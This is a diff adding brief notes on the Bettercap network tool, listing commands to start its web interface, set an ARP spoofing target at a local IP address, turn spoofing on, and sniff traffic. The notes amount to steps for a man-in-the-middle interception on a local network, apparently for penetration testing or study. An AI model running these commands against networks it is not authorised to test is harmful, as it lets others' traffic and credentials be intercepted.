@@ -1,0 +1,12 @@
+Bettercap via a web UI, interactive session, or scripting.
+
+$ sudo bettercap -caplet http-ui
+
+open http:\\127.0.0.1
+
+Choosing a Target to Spoof
+> set arp.spoof.targets 192.168.81.70
+> arp.spoof on
+
+Capturing Data with Bettercap
+> net.sniff on
